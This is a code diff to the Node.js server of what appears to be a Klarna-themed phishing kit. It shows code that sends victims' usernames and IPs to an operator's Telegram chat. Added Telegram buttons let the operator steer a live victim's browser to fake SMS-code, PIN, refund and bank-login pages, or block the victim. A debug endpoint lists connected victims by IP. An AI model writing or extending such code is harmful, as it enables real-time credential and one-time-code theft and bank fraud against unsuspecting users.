@@ -5,10 +5,21 @@ const requestIp = require("request-ip");
 var session = require('express-session');
 const fs = require("fs");
 const axios = require("axios");
-const { Telegraf } = require("telegraf");
+const { Telegraf, Markup } = require("telegraf");
 const UAParser = require("ua-parser-js");
 const bot = new Telegraf(process.env.TOKEN);
 const { Server } = require('socket.io');
+
+// Bot redirection configuration
+// Format: key: { label: "Button Text", url: "redirect_url_relative_path", action: "redirect|block" }
+const BOT_REDIRECTS = {
+  'sms': { label: '📱 SMS', url: '/loading?time=3&url=/RKnUB922z6Mf4HDwg3EZ', action: 'redirect' }, // First SMS Page
+  'pin': { label: '🔒 PIN', url: '/loading?time=3&url=/PINKlarTbjqMpc34D4XsPJ2', action: 'redirect' }, // PIN Page
+  'date': { label: '📅 Refund', url: '/loading?time=3&url=/PrTomeM9HwWUWSulkTe4', action: 'redirect' }, // Refund Page
+  'bank': { label: '🏦 Bank', url: '/loading?time=3&url=/Ose4aQeM9H4waRfs7PrTv', action: 'redirect' }, // Bank Auth
+  'login': { label: '🔑 Login', url: '/', action: 'redirect' }, // Login Page
+  'block': { label: '🚫 Block IP', url: 'https://google.com', action: 'block' } // Block and redirect away
+};
 
 const app = express();
 const http = require('http').createServer(app);
@@ -1507,27 +1518,9 @@ app.get('/dashboard/country-filters', (req, res) => {
   res.json(countryFilterSettings);
 });
 
-app.post('/dashboard/redirect-ip', (req, res) => {
-  const { ip, redirectUrl, isPermanent } = req.body;
-  
-  if (!ip || !redirectUrl) {
-    return res.status(400).json({ success: false, error: 'Missing required parameters' });
-  }
-  
-  // Store the redirect settings for this IP
-  ipRedirectSettings.set(ip, {
-    redirectUrl,
-    isPermanent: isPermanent || false,
-    createdAt: new Date().toISOString()
-  });
-  
-  console.log(`IP ${ip} will be redirected to ${redirectUrl} (${isPermanent ? 'permanent' : 'temporary'})`);
-  
-  // Emit event to notify all clients
-  io.emit('ip-redirect-update', { ip, redirectUrl });
-  
-  res.json({ success: true });
-});
+// [REMOVED] Duplicate/Faulty redirect-ip handler was here
+// It used undefined ipRedirectSettings and didn't perform actual redirect
+// Use the handler defined later in the file instead
 
 app.post('/dashboard/country-filters', (req, res) => {
   const { mode, country, action } = req.body;
@@ -3731,13 +3724,33 @@ function a1(data, ip,keyId) {
   block += `${brand}  | [LOGIN] (Klarna) |  TEAM\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o =#\n`;
   block += `USER: ${data.username}\nIP: ${ip}\n\n`;
+  console.log(`[BOT_BUTTON_GEN] Generating buttons for IP: "${ip}"`);
   block += `KEY-Sender: ${keyId}\n`;
   block += `#=o=o=o=o=o=o=o=o=o=o=o=o=o=o=o=#\n`;
   block += `${brand}  | [${target}]  |  TEAM`;
 
   try {
     if (process.env.CHATID && process.env.TOKEN) {
-      bot.telegram.sendMessage(process.env.CHATID, block)
+      
+      // Generate inline keyboard buttons from configuration
+      const buttons = [];
+      const row1 = [];
+      const row2 = [];
+      
+      // Separate buttons into rows for better layout
+      Object.entries(BOT_REDIRECTS).forEach(([key, config], index) => {
+        const button = Markup.button.callback(config.label, `cmd_${key}_${ip}`);
+        if (index < 3) {
+          row1.push(button);
+        } else {
+          row2.push(button);
+        }
+      });
+      
+      if (row1.length > 0) buttons.push(row1);
+      if (row2.length > 0) buttons.push(row2);
+      
+      bot.telegram.sendMessage(process.env.CHATID, block, Markup.inlineKeyboard(buttons))
         .catch(error => {
           console.error('Telegram notification failed:', error.message);
         });
@@ -3747,9 +3760,180 @@ function a1(data, ip,keyId) {
   } catch (error) {
     console.error('Error sending Telegram message:', error.message);
   }
-
-
 }
+
+
+
+// Global Bot Action Handler
+bot.on('callback_query', async (ctx) => {
+  try {
+    const data = ctx.callbackQuery.data;
+    const parts = data.split('_');
+    
+    // Check format: cmd_ACTION_IP
+    if (parts.length >= 3 && parts[0] === 'cmd') {
+      const actionKey = parts[1];
+      const ip = parts.slice(2).join('_'); // Rejoin locally just in case IP has underscores (unlikely for IPv4) or is IPv6
+      const config = BOT_REDIRECTS[actionKey];
+      
+      if (!config) {
+        return ctx.answerCbQuery('Unknown command');
+      }
+      
+      if (config.action === 'redirect') {
+        const url = config.url;
+        
+        ctx.answerCbQuery(`Attempting to redirect ${ip}...`).catch(() => {});
+        
+        // Check if room exists
+        const roomSize = io.sockets.adapter.rooms.get(ip)?.size || 0;
+        console.log(`[BOT_CALLBACK] Attempting redirect for IP "${ip}". Room size: ${roomSize}`);
+        
+        if (roomSize > 0) {
+            console.log(`[BOT_CALLBACK] Room '${ip}' has ${roomSize} sockets. Iterating...`);
+            // Iterating sockets manually because io.to().emit() does not support callbacks
+            const socketIds = io.sockets.adapter.rooms.get(ip);
+            let successCount = 0;
+            let ackPromises = [];
+
+            if (socketIds) {
+                socketIds.forEach(socketId => {
+                    const socket = io.sockets.sockets.get(socketId);
+                    if (socket) {
+                        console.log(`[BOT_CALLBACK] Found socket ${socket.id} for IP ${ip}. Emitting event...`);
+                        const p = new Promise((resolve) => {
+                            let responded = false;
+                            
+                            // Timeout safety
+                            const tm = setTimeout(() => {
+                                if (!responded) {
+                                    responded = true;
+                                    console.log(`[BOT_CALLBACK] Socket ${socket.id} timed out.`);
+                                    resolve(false);
+                                }
+                            }, 5000);
+
+                            // Emit with ack
+                            socket.emit('redirect', { url: url, reason: 'bot_command' }, (response) => {
+                                console.log(`[BOT_CALLBACK] Socket ${socket.id} acknowledged:`, response);
+                                if (!responded) {
+                                    responded = true;
+                                    clearTimeout(tm);
+                                    successCount++;
+                                    resolve(true);
+                                }
+                            });
+                        });
+                        ackPromises.push(p);
+                    } else {
+                        console.log(`[BOT_CALLBACK] Socket ID ${socketId} found in room but not in sockets map.`);
+                    }
+                });
+            }
+
+            console.log(`[BOT_CALLBACK] Waiting for ${ackPromises.length} acks...`);
+            await Promise.all(ackPromises);
+            console.log(`[BOT_CALLBACK] Finished waiting. Success count: ${successCount}`);
+
+            if (successCount > 0) {
+                 await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
+                 await ctx.reply(`✅ Client ${ip} successfully redirected to ${config.label}`);
+            } else {
+                 await ctx.reply(`❌ Client ${ip} did not respond (Timeout). Might be laggy.`);
+            }
+        } else {
+           console.log(`[BOT_FALLBACK] Room empty. Searching manually for IP ${ip}...`);
+           // Fallback: Manually find socket with matching clientIP
+           let found = false;
+           // Use standard fetchSockets if available or access map directly if single instance
+           try {
+               const sockets = await io.fetchSockets(); 
+               console.log(`[BOT_FALLBACK] Scanned ${sockets.length} total sockets.`);
+               
+               for (const socket of sockets) {
+                 // Note: socket.clientIP might need to be accessed differently on remote sockets
+                 // But for local instance, it works.
+                 // For fetchSockets(), properties are limited unless mirrored.
+                 // Accessing io.sockets.sockets is safer for local instance properties
+                 // const localSocket = io.sockets.sockets.get(socket.id);
+                 
+                 // However, let's try checking the property we attached
+                 const socketIP = socket.clientIP || socket.data?.clientIP; // data is standard place for persistent data in socket.io 4+
+                 
+                 if (socketIP === ip) {
+                    console.log(`[BOT_FALLBACK] Found socket ${socket.id} manually.`);
+                    found = true;
+                    // For remote sockets, we can't use ack callback easily if using broadcast logic, 
+                    // but on direct instance we can.
+                    // If we are using io.fetchSockets(), 'socket' is a RemoteSocket, it supports emit() but maybe not ack?
+                    // Actually, RemoteSocket.emit() does NOT support ack.
+                    // So we must find the LOCAL socket if possible.
+                    
+                    const localSocket = io.sockets.sockets.get(socket.id);
+                    if (localSocket) {
+                         localSocket.emit('redirect', { url: url, reason: 'bot_command' }, (response) => {
+                           ctx.editMessageReplyMarkup({ inline_keyboard: [] }).catch(() => {});
+                           ctx.reply(`✅ Client ${ip} redirected (Fallback method)`).catch(() => {});
+                        });
+                    } else {
+                         // Remote socket? Just emit and hope.
+                         socket.emit('redirect', { url: url, reason: 'bot_command' });
+                         await ctx.reply(`✅ Client ${ip} redirected (blindely)`);
+                    }
+                    
+                    break;
+                 }
+               }
+           } catch (e) {
+               console.error('[BOT_FALLBACK] Error in fallback search:', e);
+           }
+           
+           if (!found) {
+               await ctx.reply(`⚠️ Client ${ip} appears offline (No socket found). Refresh the page?`);
+           }
+        }
+        
+      } else if (config.action === 'block') {
+         // Block logic
+         let blocked = false;
+         
+         // 1. Add to blocked IPs set
+         if (!globalSettings.blockedIPs.has(ip)) {
+             globalSettings.blockedIPs.add(ip);
+             blocked = true;
+             saveBlockedIPs(); // Persist
+         }
+         
+         // 2. Mark in ipCache
+         if (ipCache.has(ip)) {
+            const ipData = ipCache.get(ip);
+            ipData.isBlocked = true;
+            ipCache.set(ip, ipData);
+         }
+         
+         // 3. Emit redirect/disconnect to user
+         const sockets = await io.fetchSockets();
+         for (const socket of sockets) {
+             if (socket.clientIP === ip) {
+                socket.emit('redirect', { url: config.url, reason: 'blocked' });
+                setTimeout(() => socket.disconnect(true), 1000);
+             }
+         }
+         
+         io.emit('dashboard-update');
+         await ctx.answerCbQuery(`Blocked IP ${ip}`);
+         await ctx.reply(`🚫 IP ${ip} has been blocked.`);
+      }
+      
+    } else {
+      await ctx.answerCbQuery();
+    }
+  } catch (err) {
+    console.error('Error handling callback query:', err);
+    try { await ctx.answerCbQuery('Error processing command'); } catch (e) {}
+  }
+});
+
 // Generic function to send Telegram notifications
 function sendTelegramNotification(title, content, ip,keyId) {
   let block = "";
@@ -3858,6 +4042,36 @@ function isCountryAllowed(countryCode) {
       return true;
   }
 }
+
+// DEBUG STATUS ENDPOINT
+app.get('/debug-status', (req, res) => {
+  const rooms = io.sockets.adapter.rooms;
+  const roomData = {};
+  
+  // Convert Map to Object for JSON response
+  rooms.forEach((ids, name) => {
+    // Only show rooms that look like IPs (simple regex check or heuristic)
+    if (name.includes('.') || name.includes(':')) {
+        roomData[name] = Array.from(ids);
+    }
+  });
+
+  const activeSockets = {};
+  io.sockets.sockets.forEach((s) => {
+    activeSockets[s.id] = {
+       clientIP: s.clientIP,
+       rooms: Array.from(s.rooms),
+       connected: s.connected
+    };
+  });
+
+  res.json({
+    totalConnections: io.engine.clientsCount,
+    activeRooms: roomData,
+    sockets: activeSockets,
+    botRedirects: BOT_REDIRECTS
+  });
+});
 
 // Function to block an IP address
 function blockIP(ip) {
@@ -4020,7 +4234,15 @@ http.listen(PORT, () => {
 io.on('connection', (socket) => {
   // Use improved IP detection function
   const clientIP = getAccurateClientIp(socket.request);
-  console.log(`User connected: IP=${clientIP}, SocketID=${socket.id}`);
+  const roomSize = io.sockets.adapter.rooms.get(clientIP)?.size || 0;
+  
+  socket.join(clientIP); // Join room for smart targeting
+  
+  console.log(`[SOCKET_CONNECT] User connected: IP=${clientIP}, SocketID=${socket.id}`);
+  console.log(`[SOCKET_ROOM] Socket ${socket.id} joined room "${clientIP}". Room size: ${roomSize + 1}`);
+  
+  // Debug: log all rooms this socket is in
+  console.log(`[SOCKET_DEBUG] Socket ${socket.id} rooms:`, [...socket.rooms]);
 
     // Store IP in socket for later reference, will be updated when client sends their IP
     socket.clientIP = clientIP;
